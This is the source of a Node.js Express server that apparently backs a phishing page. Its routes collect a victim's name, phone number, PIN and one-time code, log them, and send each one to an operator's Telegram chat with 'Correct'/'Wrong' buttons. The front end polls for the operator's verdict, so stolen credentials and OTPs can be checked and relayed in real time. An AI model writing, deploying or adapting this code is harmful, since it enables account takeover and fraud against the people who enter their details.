require('dotenv').config();
const express = require('express');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = 3000;

// In-memory approved pins and codes
const approvedPins = {};
const approvedCodes = {};

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Helper to send Telegram messages
async function sendTelegramMessage(text, inlineKeyboard = null) {
    try {
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text,
        };
        if (inlineKeyboard) payload.reply_markup = { inline_keyboard: inlineKeyboard };

        const res = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            payload
        );
        console.log('✅ Telegram message sent:', res.data);
    } catch (err) {
        console.error('❌ Failed to send Telegram message:', err.message);
    }
}

// ---------------------- Routes ----------------------

// Submit PIN
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin } = req.body;
    console.log('📩 /submit-pin HIT', { name, phone, pin });

    approvedPins[pin] = null; // pending

    // Send Telegram message with buttons
    const inlineKeyboard = [
        [
            { text: '✅ Correct PIN', callback_data: `correct_pin:${pin}` },
            { text: '❌ Wrong PIN', callback_data: `wrong_pin:${pin}` }
        ]
    ];

    const msg = `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`;
    sendTelegramMessage(msg, inlineKeyboard);

    res.json({ status: 'pending' });
});

// Check PIN approval (front-end polling)
app.get('/check-pin/:pin', (req, res) => {
    const pin = req.params.pin;
    const state = approvedPins[pin];

    if (state === true) return res.json({ approved: true });
    if (state === false) return res.json({ approved: false });
    return res.json({ approved: null }); // still waiting
});

// Submit CODE
app.post('/submit-code', (req, res) => {
    const { name, phone, code } = req.body;
    console.log('📩 /submit-code HIT', { name, phone, code });

    approvedCodes[code] = null; // pending

    const inlineKeyboard = [
        [
            { text: '✅ Correct Code', callback_data: `correct_code:${code}` },
            { text: '❌ Wrong Code', callback_data: `wrong_code:${code}` }
        ]
    ];

    // Send Telegram message with name, phone, and code
    const msg = `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`;
    sendTelegramMessage(msg, inlineKeyboard);

    res.json({ status: 'pending' });
});

// Check CODE approval (front-end polling)
app.get('/check-code/:code', (req, res) => {
    const code = req.params.code;
    const state = approvedCodes[code];

    if (state === true) return res.json({ approved: true });
    if (state === false) return res.json({ approved: false });
    return res.json({ approved: null }); // still waiting
});

// ---------------------- Telegram Webhook ----------------------
app.post('/telegram-webhook', express.json(), (req, res) => {
    console.log('📩 Telegram callback received:', JSON.stringify(req.body, null, 2));

    const callback = req.body?.callback_query;
    if (!callback) return res.sendStatus(200);

    const [action, value] = callback.data.split(':');

    if (action === 'correct_pin') approvedPins[value] = true;
    if (action === 'wrong_pin') approvedPins[value] = false;

    if (action === 'correct_code') approvedCodes[value] = true;
    if (action === 'wrong_code') approvedCodes[value] = false;

    return res.json({ text: 'Action received' });
});

// ---------------------- Start Server ----------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
